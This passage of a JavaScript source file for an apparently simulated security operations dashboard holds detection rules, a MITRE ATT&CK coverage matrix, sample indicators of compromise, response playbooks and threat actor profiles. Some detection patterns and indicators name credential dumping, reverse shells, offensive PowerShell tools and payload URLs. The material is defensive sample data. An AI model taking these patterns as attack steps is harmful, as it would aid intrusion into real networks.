  {id:'DET-022',name:'Suspicious Email Forward Rule',type:'event',source:'Exchange/O365',condition:'New inbox rule forwarding to external domain',severity:'Medium',enabled:true,mitre:'T1114.003',action:'Alert + Disable Rule'},
  {id:'DET-023',name:'Process Injection Detected',type:'behavioral',source:'EDR',condition:'WriteProcessMemory + CreateRemoteThread from non-debugger process',severity:'Critical',enabled:true,mitre:'T1055',action:'Alert + Kill Process + Isolate'},
  {id:'DET-024',name:'LDAP Enumeration',type:'threshold',source:'DC Logs',condition:'> 20 LDAP searches with objectClass=* scope=subtree in 1 minute',severity:'Medium',enabled:true,mitre:'T1087.002',action:'Alert + Monitor'},
  {id:'DET-025',name:'WMI Remote Execution',type:'pattern',source:'Windows Events',condition:'wmic.exe with /node: parameter or WMI Win32_Process Create method',severity:'High',enabled:true,mitre:'T1047',action:'Alert + Block WMI'},
  {id:'DET-026',name:'DCSync Replication Request',type:'pattern',source:'Windows Events',condition:'EventID 4662 with replication GUID from non-DC source',severity:'Critical',enabled:true,mitre:'T1003.006',action:'Alert + Block + Reset krbtgt'},
  {id:'DET-027',name:'NTDS.dit Access',type:'event',source:'Windows Events',condition:'ntdsutil.exe or vssadmin with NTDS references',severity:'Critical',enabled:true,mitre:'T1003.003',action:'Alert + Isolate DC'},
  {id:'DET-028',name:'Registry Persistence',type:'pattern',source:'Sysmon',condition:'Registry key modification in Run/RunOnce/Services paths',severity:'High',enabled:true,mitre:'T1547.001',action:'Alert + Revert Registry'},
  {id:'DET-029',name:'Suspicious Email Forward Rule',type:'event',source:'Exchange/O365',condition:'New inbox rule forwarding all mail to external address',severity:'Medium',enabled:true,mitre:'T1114.003',action:'Alert + Remove Rule'},
  {id:'DET-030',name:'Cloud API Key Created',type:'event',source:'Cloud Audit',condition:'CreateAccessKey or CreateServiceAccountKey events',severity:'High',enabled:true,mitre:'T1098.001',action:'Alert + Review Permissions'},
  {id:'DET-031',name:'File Integrity Violation',type:'event',source:'HIDS',condition:'Checksum change detected on critical system files',severity:'Critical',enabled:true,mitre:'T1565.001',action:'Alert + Quarantine + Restore'},
  {id:'DET-032',name:'Reverse Shell Detection',type:'behavioral',source:'NDR',condition:'Interactive shell traffic pattern: stdin/stdout over TCP to external IP',severity:'Critical',enabled:true,mitre:'T1059',action:'Alert + Kill + Block'},
  {id:'DET-033',name:'Token Impersonation',type:'pattern',source:'Windows Events',condition:'EventID 4648 with explicit credentials to privileged account',severity:'High',enabled:true,mitre:'T1134.001',action:'Alert + Terminate Session'},
  {id:'DET-034',name:'LLMNR/NBT-NS Poisoning',type:'behavioral',source:'NDR',condition:'LLMNR/NBT-NS responses from non-DNS server with NTLM challenge',severity:'High',enabled:true,mitre:'T1557.001',action:'Alert + Disable Protocol'},
  {id:'DET-035',name:'Suspicious PowerShell Module Load',type:'pattern',source:'Script Block Logging',condition:'Import of known offensive modules (PowerSploit, Empire, Rubeus)',severity:'Critical',enabled:true,mitre:'T1059.001',action:'Alert + Kill Process + Isolate'},
  {id:'DET-036',name:'USB Device Connected to Server',type:'event',source:'Windows Events',condition:'PnP device installation on server-class systems',severity:'Medium',enabled:true,mitre:'T1091',action:'Alert + Investigate'},
  {id:'DET-037',name:'Abnormal Process Ancestry',type:'behavioral',source:'EDR',condition:'Common LOLBin spawned from unusual parent (e.g., Excel spawns powershell)',severity:'High',enabled:true,mitre:'T1059.001',action:'Alert + Block + Investigate'},
  {id:'DET-038',name:'DNS Zone Transfer Attempt',type:'pattern',source:'DNS Logs',condition:'AXFR query from non-secondary DNS server',severity:'Medium',enabled:true,mitre:'T1590.002',action:'Alert + Block Source'},
  {id:'DET-039',name:'Credential in Command Line',type:'pattern',source:'Process Logs',condition:'Password or credential string visible in process CommandLine field',severity:'Medium',enabled:true,mitre:'T1552.001',action:'Alert + Rotate Credential'},
  {id:'DET-040',name:'Suspicious Named Pipe',type:'behavioral',source:'Sysmon',condition:'Named pipe matching known C2 patterns (Cobalt Strike, Metasploit)',severity:'Critical',enabled:true,mitre:'T1570',action:'Alert + Kill Process + Isolate'},
];


// ========== MITRE ATT&CK MATRIX ==========
const MITRE_MATRIX = [
  {tactic:'Reconnaissance',id:'TA0043',techniques:[
    {id:'T1595',name:'Active Scanning',covered:true,alerts:2},
    {id:'T1592',name:'Gather Victim Host Info',covered:false,alerts:0},
    {id:'T1589',name:'Gather Victim Identity',covered:false,alerts:0},
    {id:'T1590',name:'Gather Victim Network',covered:false,alerts:0},
    {id:'T1591',name:'Gather Victim Org Info',covered:false,alerts:0},
  ]},
  {tactic:'Resource Development',id:'TA0042',techniques:[
    {id:'T1583',name:'Acquire Infrastructure',covered:false,alerts:0},
    {id:'T1586',name:'Compromise Accounts',covered:false,alerts:0},
    {id:'T1584',name:'Compromise Infrastructure',covered:false,alerts:0},
    {id:'T1587',name:'Develop Capabilities',covered:false,alerts:0},
    {id:'T1585',name:'Establish Accounts',covered:false,alerts:0},
  ]},
  {tactic:'Initial Access',id:'TA0001',techniques:[
    {id:'T1190',name:'Exploit Public-Facing App',covered:true,alerts:3},
    {id:'T1133',name:'External Remote Services',covered:true,alerts:1},
    {id:'T1566',name:'Phishing',covered:true,alerts:2},
    {id:'T1078',name:'Valid Accounts',covered:true,alerts:4},
    {id:'T1110',name:'Brute Force',covered:true,alerts:5},
  ]},
  {tactic:'Execution',id:'TA0002',techniques:[
    {id:'T1059',name:'Command & Scripting',covered:true,alerts:8},
    {id:'T1053',name:'Scheduled Task/Job',covered:true,alerts:2},
    {id:'T1047',name:'WMI',covered:true,alerts:1},
    {id:'T1218',name:'System Binary Proxy',covered:true,alerts:3},
    {id:'T1204',name:'User Execution',covered:false,alerts:0},
  ]},
  {tactic:'Persistence',id:'TA0003',techniques:[
    {id:'T1136',name:'Create Account',covered:true,alerts:2},
    {id:'T1543',name:'Create/Modify System Process',covered:true,alerts:3},
    {id:'T1053',name:'Scheduled Task',covered:true,alerts:2},
    {id:'T1505',name:'Server Software Component',covered:true,alerts:1},
    {id:'T1547',name:'Boot/Logon Autostart',covered:true,alerts:1},
  ]},
  {tactic:'Privilege Escalation',id:'TA0004',techniques:[
    {id:'T1068',name:'Exploitation for Priv Esc',covered:true,alerts:1},
    {id:'T1078',name:'Valid Accounts',covered:true,alerts:2},
    {id:'T1611',name:'Escape to Host',covered:true,alerts:1},
    {id:'T1548',name:'Abuse Elevation Control',covered:false,alerts:0},
    {id:'T1134',name:'Access Token Manipulation',covered:false,alerts:0},
  ]},
  {tactic:'Defense Evasion',id:'TA0005',techniques:[
    {id:'T1070',name:'Indicator Removal',covered:true,alerts:2},
    {id:'T1055',name:'Process Injection',covered:true,alerts:1},
    {id:'T1036',name:'Masquerading',covered:false,alerts:0},
    {id:'T1027',name:'Obfuscated Files',covered:false,alerts:0},
    {id:'T1562',name:'Impair Defenses',covered:true,alerts:1},
  ]},
  {tactic:'Credential Access',id:'TA0006',techniques:[
    {id:'T1003',name:'OS Credential Dumping',covered:true,alerts:4},
    {id:'T1558',name:'Steal/Forge Kerberos',covered:true,alerts:3},
    {id:'T1110',name:'Brute Force',covered:true,alerts:5},
    {id:'T1550',name:'Use Alternate Auth',covered:true,alerts:2},
    {id:'T1621',name:'MFA Request Generation',covered:true,alerts:1},
  ]},
  {tactic:'Discovery',id:'TA0007',techniques:[
    {id:'T1087',name:'Account Discovery',covered:true,alerts:2},
    {id:'T1046',name:'Network Service Scan',covered:true,alerts:1},
    {id:'T1018',name:'Remote System Discovery',covered:false,alerts:0},
    {id:'T1082',name:'System Information',covered:false,alerts:0},
    {id:'T1069',name:'Permission Groups',covered:false,alerts:0},
  ]},
  {tactic:'Lateral Movement',id:'TA0008',techniques:[
    {id:'T1021',name:'Remote Services',covered:true,alerts:3},
    {id:'T1550',name:'Use Alternate Auth',covered:true,alerts:2},
    {id:'T1047',name:'WMI',covered:true,alerts:1},
    {id:'T1570',name:'Lateral Tool Transfer',covered:false,alerts:0},
    {id:'T1563',name:'Remote Service Session',covered:false,alerts:0},
  ]},
  {tactic:'Collection',id:'TA0009',techniques:[
    {id:'T1039',name:'Data from Network Shared',covered:true,alerts:1},
    {id:'T1530',name:'Data from Cloud Storage',covered:true,alerts:2},
    {id:'T1213',name:'Data from Info Repos',covered:true,alerts:2},
    {id:'T1114',name:'Email Collection',covered:true,alerts:1},
    {id:'T1074',name:'Data Staged',covered:true,alerts:1},
  ]},
  {tactic:'Exfiltration',id:'TA0010',techniques:[
    {id:'T1048',name:'Exfil Over Alt Protocol',covered:true,alerts:2},
    {id:'T1041',name:'Exfil Over C2 Channel',covered:true,alerts:1},
    {id:'T1567',name:'Exfil Over Web Service',covered:false,alerts:0},
    {id:'T1537',name:'Transfer to Cloud Account',covered:false,alerts:0},
    {id:'T1020',name:'Automated Exfil',covered:false,alerts:0},
  ]},
  {tactic:'Command and Control',id:'TA0011',techniques:[
    {id:'T1071',name:'App Layer Protocol',covered:true,alerts:4},
    {id:'T1568',name:'Dynamic Resolution',covered:true,alerts:2},
    {id:'T1573',name:'Encrypted Channel',covered:true,alerts:1},
    {id:'T1572',name:'Protocol Tunneling',covered:false,alerts:0},
    {id:'T1090',name:'Proxy',covered:false,alerts:0},
  ]},
  {tactic:'Impact',id:'TA0040',techniques:[
    {id:'T1486',name:'Data Encrypted for Impact',covered:true,alerts:1},
    {id:'T1489',name:'Service Stop',covered:false,alerts:0},
    {id:'T1490',name:'Inhibit System Recovery',covered:false,alerts:0},
    {id:'T1561',name:'Disk Wipe',covered:false,alerts:0},
    {id:'T1499',name:'Endpoint DoS',covered:false,alerts:0},
  ]},
];

// ========== IOC DATABASE ==========
const IOC_DATABASE = [
  {type:'ip',value:'185.220.101.34',classification:'Malicious',source:'Tor Exit Node',firstSeen:'2026-09-21T08:01:12Z',lastSeen:'2026-09-21T08:15:45Z',tags:['tor','brute-force','ssh'],confidence:95},
  {type:'ip',value:'45.33.32.156',classification:'Malicious',source:'Cobalt Strike C2',firstSeen:'2026-09-21T08:07:00Z',lastSeen:'2026-09-21T08:45:00Z',tags:['c2','cobalt-strike','apt'],confidence:99},
  {type:'ip',value:'198.51.100.50',classification:'Malicious',source:'Data Exfiltration',firstSeen:'2026-09-21T08:16:00Z',lastSeen:'2026-09-21T08:41:00Z',tags:['exfil','aws-compromise'],confidence:92},
  {type:'ip',value:'203.0.113.42',classification:'Suspicious',source:'Web Scanner',firstSeen:'2026-09-21T08:45:05Z',lastSeen:'2026-09-21T08:46:30Z',tags:['scanner','nikto','sqlmap'],confidence:85},
  {type:'ip',value:'198.51.100.23',classification:'Malicious',source:'Honeypot',firstSeen:'2026-09-21T08:14:00Z',lastSeen:'2026-09-21T08:14:00Z',tags:['brute-force','ssh'],confidence:88},
  {type:'ip',value:'92.63.197.48',classification:'Suspicious',source:'Brute Force',firstSeen:'2026-09-21T08:14:30Z',lastSeen:'2026-09-21T08:15:45Z',tags:['brute-force','rdp','ssh'],confidence:82},
  {type:'ip',value:'198.51.100.99',classification:'Suspicious',source:'Okta Logs',firstSeen:'2026-09-21T08:18:30Z',lastSeen:'2026-09-21T08:19:00Z',tags:['impossible-travel','credential-stuffing'],confidence:78},
  {type:'ip',value:'198.51.100.77',classification:'Suspicious',source:'Web Logs',firstSeen:'2026-09-21T08:16:00Z',lastSeen:'2026-09-21T08:16:30Z',tags:['wordpress-scan','xmlrpc'],confidence:72},
  {type:'domain',value:'evil-c2.xyz',classification:'Malicious',source:'DNS Logs',firstSeen:'2026-09-21T08:05:30Z',lastSeen:'2026-09-21T08:17:30Z',tags:['c2','dga','dns-tunnel'],confidence:97},
  {type:'domain',value:'login-microsoft365.evil.com',classification:'Malicious',source:'Proxy Logs',firstSeen:'2026-09-21T08:28:30Z',lastSeen:'2026-09-21T08:28:30Z',tags:['phishing','credential-harvest'],confidence:95},
  {type:'domain',value:'malware-download.xyz',classification:'Malicious',source:'IDS',firstSeen:'2026-09-21T08:24:00Z',lastSeen:'2026-09-21T08:24:00Z',tags:['malware-delivery','payload'],confidence:93},
  {type:'domain',value:'company-lookalike.com',classification:'Malicious',source:'Email Gateway',firstSeen:'2026-09-21T08:27:00Z',lastSeen:'2026-09-21T08:27:00Z',tags:['bec','phishing','lookalike'],confidence:90},
  {type:'domain',value:'registry.evil.com',classification:'Malicious',source:'K8s',firstSeen:'2026-09-21T08:09:00Z',lastSeen:'2026-09-21T08:09:00Z',tags:['supply-chain','container'],confidence:85},
  {type:'domain',value:'suspicious-repo.xyz',classification:'Suspicious',source:'APT Mirror',firstSeen:'2026-09-21T08:23:30Z',lastSeen:'2026-09-21T08:23:30Z',tags:['supply-chain','tampered-package'],confidence:75},
  {type:'hash',value:'a1b2c3d4e5f6...(SHA256)',classification:'Malicious',source:'EDR',firstSeen:'2026-09-21T08:21:00Z',lastSeen:'2026-09-21T08:21:00Z',tags:['cobalt-strike','beacon','powershell'],confidence:98},
  {type:'hash',value:'d4e5f6a7b8c9...(SHA256)',classification:'Malicious',source:'SentinelOne',firstSeen:'2026-09-21T08:25:00Z',lastSeen:'2026-09-21T08:25:00Z',tags:['cobalt-strike','beacon','dll'],confidence:99},
  {type:'hash',value:'abc123def456(MD5)',classification:'Malicious',source:'Carbon Black',firstSeen:'2026-09-21T08:29:30Z',lastSeen:'2026-09-21T08:29:30Z',tags:['mimikatz','credential-dump'],confidence:99},
  {type:'email',value:'ceo@company-lookalike.com',classification:'Malicious',source:'Proofpoint',firstSeen:'2026-09-21T08:27:00Z',lastSeen:'2026-09-21T08:27:00Z',tags:['bec','impersonation'],confidence:92},
  {type:'email',value:'attacker@evil-domain.com',classification:'Malicious',source:'O365 Audit',firstSeen:'2026-09-21T08:25:30Z',lastSeen:'2026-09-21T08:25:30Z',tags:['exfil','email-forward'],confidence:90},
  {type:'url',value:'http://198.51.100.50/payload.sh',classification:'Malicious',source:'Audit Logs',firstSeen:'2026-09-21T08:26:00Z',lastSeen:'2026-09-21T08:26:00Z',tags:['payload','dropper'],confidence:95},
  {type:'url',value:'http://10.0.2.100:8080/shell.ps1',classification:'Malicious',source:'Process Logs',firstSeen:'2026-09-21T08:32:00Z',lastSeen:'2026-09-21T08:32:00Z',tags:['powershell','reverse-shell'],confidence:97},
];

// ========== PLAYBOOKS ==========
const PLAYBOOKS = [
  {id:'PB-001',name:'SSH Brute Force Response',severity:'High',mitre:'T1110',steps:[
    {order:1,action:'Verify alert authenticity',detail:'Check source IP reputation, confirm login failures in auth logs',automated:true},
    {order:2,action:'Block source IP',detail:'Add IP to firewall block list via automated rule or manual update',automated:true},
    {order:3,action:'Check for successful auth',detail:'Search for EventID 4624/Accepted publickey from same source IP',automated:false},
    {order:4,action:'Assess impact',detail:'If login succeeded, escalate to incident. Check for persistence mechanisms.',automated:false},
    {order:5,action:'Notify SOC lead',detail:'Escalate if > 100 attempts or if targeting admin accounts',automated:true},
    {order:6,action:'Document and close',detail:'Record findings in ticketing system, update threat intel feed',automated:false},
  ]},
  {id:'PB-002',name:'Malware Detection Response',severity:'Critical',mitre:'T1059',steps:[
    {order:1,action:'Isolate affected host',detail:'Network isolation via EDR or switch port disable',automated:true},
    {order:2,action:'Collect forensic artifacts',detail:'Memory dump, process list, network connections, autoruns',automated:true},
    {order:3,action:'Identify malware family',detail:'Submit sample to sandbox, check hash against threat intel',automated:true},
    {order:4,action:'Search for lateral movement',detail:'Check for SMB/RDP/WMI connections from isolated host',automated:false},
    {order:5,action:'Identify C2 infrastructure',detail:'Extract IOCs from malware sample, block C2 domains/IPs',automated:false},
    {order:6,action:'Eradicate and recover',detail:'Clean host, reset credentials, restore from backup if needed',automated:false},
    {order:7,action:'Post-incident review',detail:'Update detection rules, conduct lessons learned',automated:false},
  ]},
  {id:'PB-003',name:'Data Exfiltration Response',severity:'Critical',mitre:'T1048',steps:[
    {order:1,action:'Block outbound transfer',detail:'Block destination IP/domain at firewall and proxy',automated:true},
    {order:2,action:'Identify data scope',detail:'Determine what data was accessed and potentially exfiltrated',automated:false},
    {order:3,action:'Preserve evidence',detail:'Capture network traffic, proxy logs, and DLP alerts',automated:true},
    {order:4,action:'Assess regulatory impact',detail:'Check if PII/PHI/PCI data was involved, notify legal/compliance',automated:false},
    {order:5,action:'Contain compromised account',detail:'Disable user account, reset passwords, revoke tokens',automated:true},
    {order:6,action:'Notify management',detail:'Prepare executive briefing on data exposure scope',automated:false},
    {order:7,action:'File regulatory notifications',detail:'Submit breach notifications per applicable regulations',automated:false},
  ]},
  {id:'PB-004',name:'Ransomware Response',severity:'Critical',mitre:'T1486',steps:[
    {order:1,action:'Isolate affected systems',detail:'Immediate network isolation of all systems showing encryption activity',automated:true},
    {order:2,action:'Preserve encryption samples',detail:'Collect ransom note and encrypted file samples for analysis',automated:false},
    {order:3,action:'Identify ransomware variant',detail:'Check ransom note, file extensions, and encryption patterns',automated:false},
    {order:4,action:'Assess backup integrity',detail:'Verify offline backups are intact and not compromised',automated:false},
    {order:5,action:'Contain lateral spread',detail:'Block SMB, disable admin shares, isolate segments',automated:true},
    {order:6,action:'Activate BCM plan',detail:'Engage business continuity, notify executive team',automated:false},
    {order:7,action:'Engage law enforcement',detail:'Contact FBI/CISA for ransomware reporting',automated:false},
    {order:8,action:'Recovery and restoration',detail:'Restore from clean backups, rebuild compromised systems',automated:false},
  ]},
  {id:'PB-005',name:'Cloud Credential Compromise',severity:'Critical',mitre:'T1078.004',steps:[
    {order:1,action:'Revoke access keys',detail:'Immediately revoke/rotate compromised IAM access keys',automated:true},
    {order:2,action:'Audit cloud activity',detail:'Review CloudTrail/Activity logs for unauthorized actions',automated:false},
    {order:3,action:'Remove backdoor resources',detail:'Delete unauthorized users, roles, policies, and resources',automated:false},
    {order:4,action:'Revert policy changes',detail:'Restore S3/storage policies to pre-compromise state',automated:false},
    {order:5,action:'Enable enhanced monitoring',detail:'Turn on CloudTrail data events, GuardDuty if not active',automated:true},
    {order:6,action:'Rotate all credentials',detail:'Rotate all keys, passwords, and tokens in affected account',automated:false},
  ]},
  {id:'PB-006',name:'Phishing Response',severity:'Medium',mitre:'T1566',steps:[
    {order:1,action:'Quarantine email',detail:'Remove phishing email from all inboxes via admin purge',automated:true},
    {order:2,action:'Block sender and URLs',detail:'Add sender domain and phishing URLs to block lists',automated:true},
    {order:3,action:'Identify affected users',detail:'Search for users who clicked links or submitted credentials',automated:true},
    {order:4,action:'Reset compromised credentials',detail:'Force password reset for users who entered credentials',automated:true},
    {order:5,action:'Check for post-compromise activity',detail:'Review auth logs for suspicious access from affected accounts',automated:false},
    {order:6,action:'Update filters',detail:'Add new phishing indicators to email gateway rules',automated:true},
  ]},
  {id:'PB-007',name:'Insider Threat Response',severity:'High',mitre:'T1213',steps:[
    {order:1,action:'Verify behavior pattern',detail:'Confirm anomalous activity via UEBA and manager consultation',automated:false},
    {order:2,action:'Enable enhanced monitoring',detail:'Increase logging granularity for suspect user',automated:true},
    {order:3,action:'Preserve evidence',detail:'Legal hold on email, file access logs, and DLP events',automated:false},
    {order:4,action:'Engage HR and legal',detail:'Coordinate response with HR and legal counsel',automated:false},
    {order:5,action:'Restrict access if needed',detail:'Limit access to sensitive systems while investigation proceeds',automated:false},
    {order:6,action:'Document findings',detail:'Prepare investigation report with evidence chain',automated:false},
  ]},
  {id:'PB-008',name:'DDoS Response',severity:'High',mitre:'T1498',steps:[
    {order:1,action:'Confirm attack',detail:'Verify traffic spike is malicious vs legitimate traffic surge',automated:true},
    {order:2,action:'Engage DDoS mitigation',detail:'Activate CDN/cloud DDoS protection or scrubbing service',automated:true},
    {order:3,action:'Implement rate limiting',detail:'Apply rate limits and geo-blocking rules at edge',automated:true},
    {order:4,action:'Monitor and tune',detail:'Adjust filtering rules based on attack vector evolution',automated:false},
    {order:5,action:'Communicate status',detail:'Update internal teams and affected customers on status',automated:false},
    {order:6,action:'Post-attack analysis',detail:'Analyze attack patterns, update DDoS runbook',automated:false},
  ]},
];

// ========== LOG INGESTION PIPELINE ==========
const INGESTION_PIPELINE = [
  {source:'Windows Event Logs',format:'EVTX/XML',eps:1250,status:'healthy',latency:'1.2s',retention:'90 days',collectors:['WinLogBeat','NXLog']},
  {source:'Syslog (Linux/Network)',format:'RFC5424',eps:3400,status:'healthy',latency:'0.8s',retention:'90 days',collectors:['rsyslog','syslog-ng']},
  {source:'Firewall Logs',format:'Syslog/CEF',eps:5200,status:'healthy',latency:'1.0s',retention:'180 days',collectors:['PAN-OS Syslog','Fortinet FortiAnalyzer']},
  {source:'EDR Telemetry',format:'JSON',eps:8900,status:'healthy',latency:'2.1s',retention:'365 days',collectors:['CrowdStrike Falcon','SentinelOne']},
  {source:'Cloud Audit Logs',format:'JSON',eps:420,status:'healthy',latency:'3.5s',retention:'365 days',collectors:['CloudTrail','Azure Monitor','GCP Audit']},
  {source:'DNS Query Logs',format:'Passive DNS',eps:12000,status:'warning',latency:'0.5s',retention:'30 days',collectors:['Passive DNS Tap','DNS Firewall']},
  {source:'Proxy/WAF Logs',format:'CEF/W3C',eps:2800,status:'healthy',latency:'1.5s',retention:'90 days',collectors:['Squid','ModSecurity','Zscaler']},
  {source:'Email Gateway',format:'JSON/CEF',eps:180,status:'healthy',latency:'4.0s',retention:'180 days',collectors:['Proofpoint TAP','Exchange Online']},
  {source:'Identity Provider',format:'JSON',eps:320,status:'healthy',latency:'2.8s',retention:'180 days',collectors:['Okta Syslog','Azure AD']},
  {source:'Container Runtime',format:'JSON',eps:1500,status:'degraded',latency:'5.2s',retention:'30 days',collectors:['Falco','Docker daemon']},
];

// ========== INVESTIGATION CHECKLIST ==========
const INVESTIGATION_CHECKLISTS = {
  'brute-force': [
    'Verify source IP against threat intelligence feeds',
    'Check if source IP is a known Tor exit node or proxy',
    'Determine if any login attempts succeeded',
    'Identify all targeted accounts',
    'Check for password spray patterns (single password, multiple accounts)',
    'Review geo-location of source IP',
    'Check if target accounts have MFA enabled',
    'Verify rate limiting rules are effective',
    'Add source IP to block list if confirmed malicious',
    'Reset passwords for any compromised accounts',
    'Review and update brute force detection thresholds',
  ],
  'malware': [
    'Isolate affected endpoint from network',
    'Capture volatile memory for forensic analysis',
    'Document running processes and network connections',
    'Identify malware family and variant',
    'Extract IOCs (hashes, domains, IPs, mutexes)',
    'Search for lateral movement from affected host',
    'Check for persistence mechanisms (services, tasks, registry)',
    'Identify initial infection vector',
    'Submit sample to sandbox for behavioral analysis',
    'Block extracted IOCs at perimeter',
    'Check other endpoints for same indicators',
    'Prepare timeline of compromise',
  ],
  'data-exfil': [
    'Identify data classification of exfiltrated content',
    'Determine volume and duration of exfiltration',
    'Block destination IP/domain at firewall',
    'Identify method of exfiltration (HTTP, DNS, email)',
    'Determine if data was encrypted before transfer',
    'Identify compromised account used for access',
    'Review DLP logs for data classification',
    'Assess regulatory notification requirements',
    'Preserve all network traffic logs as evidence',
    'Notify legal and compliance teams',
    'Prepare data breach impact assessment',
  ],
  'lateral-movement': [
    'Identify source and destination hosts',
    'Determine authentication method used (NTLM, Kerberos, SSH)',
    'Check for pass-the-hash or pass-the-ticket indicators',
    'Review admin share access (C$, ADMIN$)',
    'Check for WMI/PSExec/WinRM remote execution',
    'Identify tools used for lateral movement',
    'Map all hosts accessed from compromised account',
    'Check for credential dumping on each hop',
    'Determine if data was staged on intermediate hosts',
    'Isolate all confirmed compromised hosts',
  ],
  'credential-access': [
    'Identify credential dumping technique used',
    'Determine which accounts were compromised',
    'Check for Golden/Silver Ticket attacks',
    'Review LSASS access events on domain controllers',
    'Check for DCSync replication requests',
    'Identify if passwords or hashes were obtained',
    'Force password reset for all compromised accounts',
    'Revoke Kerberos tickets (krbtgt reset if Golden Ticket)',
    'Review and harden credential storage',
    'Enable credential guard on critical systems',
  ],
};

// ========== THREAT ACTOR PROFILES ==========
const THREAT_ACTORS = [
  {name:'APT29 / Cozy Bear',nation:'Russia',sectors:['Government','Defense','Healthcare','Energy'],ttps:['T1059.001','T1071.001','T1550.002','T1003.001','T1098'],tools:['Cobalt Strike','Mimikatz','custom backdoors'],confidence:'High',relevance:'Active campaign TTPs match observed behavior'},
  {name:'APT28 / Fancy Bear',nation:'Russia',sectors:['Government','Military','Media','Elections'],ttps:['T1566','T1059','T1110','T1027'],tools:['X-Agent','Zebrocy','Responder'],confidence:'Medium',relevance:'Some TTP overlap in credential harvesting'},
  {name:'Lazarus Group',nation:'North Korea',sectors:['Financial','Crypto','Defense','Technology'],ttps:['T1486','T1059.001','T1071.001','T1048'],tools:['custom RATs','WannaCry variants','ELECTRICFISH'],confidence:'Low',relevance:'Ransomware behavior partially matches'},
  {name:'APT41 / Wicked Panda',nation:'China',sectors:['Technology','Healthcare','Gaming','Telecom'],ttps:['T1190','T1505.003','T1055','T1059'],tools:['Cobalt Strike','ShadowPad','PlugX'],confidence:'Medium',relevance:'Supply chain and web shell TTPs relevant'},
  {name:'FIN7 / Carbanak',nation:'Russia',sectors:['Retail','Hospitality','Financial','Restaurant'],ttps:['T1566','T1059.001','T1003','T1048'],tools:['Carbanak RAT','Cobalt Strike','Metasploit'],confidence:'Medium',relevance:'Financial sector targeting and Cobalt Strike usage'},
];

// ========== MAIN RENDER ==========
export function renderCitadel(main) {
  var activeTab = 'dashboard';
  var logFilter = {format:'all',severity:'all',search:'',source:'all'};
  var triageFilter = {status:'all',severity:'all'};
  var huntFilter = 'all';
  var complianceFramework = 'nist_csf';
  var selectedAlert = null;
  var selectedRule = null;
  var selectedSigma = null;
  var correlationTest = null;

  function getAllLogs() {
    var all = [];
    SYSLOG_ENTRIES.forEach(function(e){all.push({ts:e.ts,format:'syslog',severity:e.severity,source:e.host,raw:e.msg,data:e});});
    JSON_LOGS.forEach(function(e){all.push({ts:e.ts,format:'json',severity:'info',source:e.source,raw:JSON.stringify(e.data,null,2),data:e});});
    CEF_LOGS.forEach(function(e){all.push({ts:e.ts,format:'cef',severity:'alert',source:'CEF',raw:e.raw,data:e});});
    WINDOWS_EVENTS.forEach(function(e){all.push({ts:e.ts,format:'windows',severity:e.level==='Warning'?'warning':e.level==='Error'?'error':'info',source:e.computer,raw:'EventID:'+e.eventId+' '+e.msg,data:e});});
    LEEF_LOGS.forEach(function(e){all.push({ts:e.ts,format:'leef',severity:'alert',source:'QRadar',raw:e.raw,data:e});});
    ACCESS_LOGS.forEach(function(e){all.push({ts:e.ts,format:'access',severity:'info',source:'nginx',raw:e.raw,data:e});});
    all.sort(function(a,b){return a.ts<b.ts?-1:a.ts>b.ts?1:0;});
    return all;
  }

  function render() {
    main.innerHTML =
      '<style>' +
      '.ct-wrap{font-family:"JetBrains Mono",ui-monospace,monospace;position:relative}' +
      '.ct-header{display:flex;align-items:center;gap:16px;padding:16px 0;border-bottom:2px solid var(--acc);position:relative}' +
      '.ct-header::after{content:"";position:absolute;bottom:-2px;left:0;width:120px;height:2px;background:var(--acc);box-shadow:0 0 12px var(--acc)}' +
      '.ct-title{font-size:1.6rem;font-weight:800;letter-spacing:.12em;color:var(--acc);text-shadow:0 0 20px color-mix(in srgb,var(--acc) 40%,transparent);margin:0}' +
      '.ct-sub{color:var(--mut);font-size:.7rem;letter-spacing:.05em;text-transform:uppercase}' +
      '.ct-dot{width:8px;height:8px;border-radius:50%;background:#00e676;box-shadow:0 0 8px #00e676;animation:ct-pulse 2s ease-in-out infinite}' +
      '@keyframes ct-pulse{0%,100%{opacity:1}50%{opacity:.4}}' +
      '.ct-tabs{display:flex;gap:2px;overflow-x:auto;padding:10px 0 0;border-bottom:none}' +
      '.ct-tab{background:transparent;border:none;border-bottom:2px solid transparent;color:var(--mut);padding:8px 14px;font-size:.68rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;cursor:pointer;transition:all .2s;font-family:inherit;white-space:nowrap;flex-shrink:0}' +
      '.ct-tab:hover{color:var(--txt);background:rgba(255,255,255,.03)}' +
      '.ct-tab.on{color:var(--acc);border-bottom-color:var(--acc);text-shadow:0 0 8px color-mix(in srgb,var(--acc) 40%,transparent)}' +
      '.ct-panel{background:var(--card);border:1px solid var(--line);border-radius:4px;overflow:hidden;margin-bottom:10px}' +
      '.ct-panel-h{padding:8px 12px;border-bottom:1px solid var(--line);background:rgba(0,0,0,.15);font-size:.68rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--mut);display:flex;align-items:center;gap:8px}' +
      '.ct-panel-b{padding:12px}' +
      '.ct-grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}' +
      '.ct-grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}' +
      '.ct-grid4{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}' +
      '.ct-stat{background:rgba(0,0,0,.2);border:1px solid var(--line);border-radius:4px;padding:10px 14px}' +
      '.ct-stat-v{font-size:1.3rem;font-weight:700;font-variant-numeric:tabular-nums}' +
      '.ct-stat-l{font-size:.6rem;color:var(--mut);letter-spacing:.04em;text-transform:uppercase;margin-top:2px}' +
      '.ct-btn{background:transparent;border:1px solid var(--acc);color:var(--acc);padding:6px 14px;font-size:.68rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;border-radius:3px;cursor:pointer;font-family:inherit;transition:all .15s}' +
      '.ct-btn:hover{background:var(--acc);color:var(--bg);box-shadow:0 0 12px color-mix(in srgb,var(--acc) 40%,transparent)}' +
      '.ct-btn-ghost{border-color:var(--line);color:var(--mut)}' +
      '.ct-btn-ghost:hover{border-color:var(--txt);color:var(--txt);background:rgba(255,255,255,.05);box-shadow:none}' +
      '.ct-btn-danger{border-color:#ff1744;color:#ff1744}' +
      '.ct-btn-danger:hover{background:#ff1744;color:#fff}' +
      '.ct-btn-sm{padding:3px 8px;font-size:.6rem}' +
      '.ct-sel{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:6px 10px;border-radius:3px;font-size:.72rem;font-family:inherit}' +
